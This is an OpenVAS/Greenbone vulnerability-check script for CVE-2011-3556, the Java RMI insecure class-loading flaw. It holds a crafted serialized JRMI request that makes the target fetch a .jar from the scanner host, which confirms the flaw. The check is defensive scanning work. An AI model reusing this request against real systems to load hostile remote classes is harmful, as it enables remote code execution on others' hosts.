# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140051");
  script_version("2022-12-21T10:12:09+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-12-21 10:12:09 +0000 (Wed, 21 Dec 2022)");
  script_tag(name:"creation_date", value:"2016-11-04 14:34:52 +0100 (Fri, 04 Nov 2016)");
  script_cve_id("CVE-2011-3556");
  script_name("Java RMI Server Insecure Default Configuration RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_rmi_registry_detect.nasl");
  script_require_ports("Services/rmi_registry", 1099);
  script_mandatory_keys("rmi_registry/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20211208040855/http://www.securitytracker.com/id?1026215");
  script_xref(name:"URL", value:"https://web.archive.org/web/20110824060234/http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html");
  script_xref(name:"URL", value:"https://tools.cisco.com/security/center/viewAlert.x?alertId=23665");

  script_tag(name:"summary", value:"Multiple Java products that implement the RMI Server contain a
  vulnerability that could allow an unauthenticated, remote attacker to execute arbitrary code
  (remote code execution/RCE) on a targeted system with elevated privileges.");

  script_tag(name:"vuldetect", value:"Sends a crafted JRMI request and checks if the target tries to
  load a Java class via a remote HTTP URL.

  Note: For a successful detection of this flaw the target host needs to be able to reach the
  scanner host on a TCP port randomly generated during the runtime of the VT (currently in the range
  of 10000-32000).");

  script_tag(name:"insight", value:"The vulnerability exists because of an incorrect default
  configuration of the Remote Method Invocation (RMI) Server in the affected software.");

  script_tag(name:"impact", value:"An unauthenticated, remote attacker could exploit the
  vulnerability by transmitting crafted packets to the affected software. When the packets are
  processed, the attacker could execute arbitrary code on the system with elevated privileges.");

  script_tag(name:"solution", value:"Disable class-loading. Please contact the vendor of the
  affected system for additional guidance.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("byte_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");
include("port_service_func.inc");

port = service_get_port( default:1099, proto:"rmi_registry" );

# nb: This might fork on multiple hostnames so it needs to be before opening any socket
src_filter = pcap_src_ip_filter_from_hostnames();

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

req = "JRMI" + raw_string( 0x00, 0x02, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 );

send( socket:soc, data:req );
res = recv( socket:soc, length:128, min:7 );

if( ! res || hexstr( res[0] ) != "4e" || ( getword( blob:res, pos:1 ) + 7 ) != strlen( res ) ) {
  close( soc );
  exit( 0 );
}

ownip = this_host();
ownhostname = this_host_name();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );

# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used by
# most standard Linux/Unix operating systems. If we're choosing a port of that range we might have
# false positives due to race conditions (target is sending back a response to a request of another
# VT for which the scanner had chosen the same source port).
rnd_port = rand_int_range( min:10000, max:32000 );

# nb: Checking for the SYN flag is done as we're not interested in any packets having other flags
# like e.g. RST or FIN. This should avoid a few false possible false positives on race conditions
# / with conflicts on the chosen random port.
filter = string( "tcp and ", dst_filter, " and dst port ", rnd_port, " and ", src_filter, " and tcp[tcpflags] & (tcp-syn) != 0" );

req = raw_string( 0x50, 0xac, 0xed, 0x00, 0x05, 0x77, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0xf6, 0xb6, 0x89, 0x8d, 0x8b, 0xf2, 0x86, 0x43, 0x75, 0x72, 0x00, 0x18, 0x5b, 0x4c, 0x6a,
                  0x61, 0x76, 0x61, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x4f,
                  0x62, 0x6a, 0x49, 0x44, 0x3b, 0x87, 0x13, 0x00, 0xb8, 0xd0, 0x2c, 0x64, 0x7e, 0x02, 0x00, 0x00,
                  0x70, 0x78, 0x70, 0x00, 0x00, 0x00, 0x00, 0x77, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x73, 0x72, 0x00, 0x14, 0x4F, 0x70, 0x65, 0x6e, 0x56, 0x61, 0x73, 0x00, 0x00, 0x74, 0x2e,
                  0x52, 0x4d, 0x49, 0x4c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0xa1, 0x65, 0x44, 0xba, 0x26, 0xf9, 0xc2,
                  0xf4, 0x02, 0x00, 0x00, 0x74, 0x00, 0x33 );

req += raw_string( 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f ) + ownip + raw_string( 0x3a ) + rnd_port;

req += "/" + rand() + "/" + rand() + ".jar";

req += raw_string( 0x01, 0x00 );

res = send_capture( socket:soc,
                    data:req,
                    timeout:5,
                    pcap_filter:filter );

close( soc );

if( res ) {
  flags = get_tcp_element( tcp:res, element:"th_flags" );
  if( flags & TH_SYN ) { # i know...filter already check for tcp-syn, but to be sure...:)

    # nb: We need to call the correct get_ip_*element() function below depending on the IP version
    # of the received IP packet.
    ip_vers_hex = hexstr( res[0] );
    if( ip_vers_hex[0] == 4 ) {
      src_ip = get_ip_element( ip:res, element:"ip_src" );
      dst_ip = get_ip_element( ip:res, element:"ip_dst" );
    } else if( ip_vers_hex[0] == 6 ) {
      src_ip = get_ipv6_element( ipv6:res, element:"ip6_src" );
      dst_ip = get_ipv6_element( ipv6:res, element:"ip6_dst" );
    }

    if( ! src_ip )
      src_ip = "N/A";

    if( ! dst_ip )
      dst_ip = "N/A";

    report  = 'By doing an RMI request it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
    report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
    report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
    report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
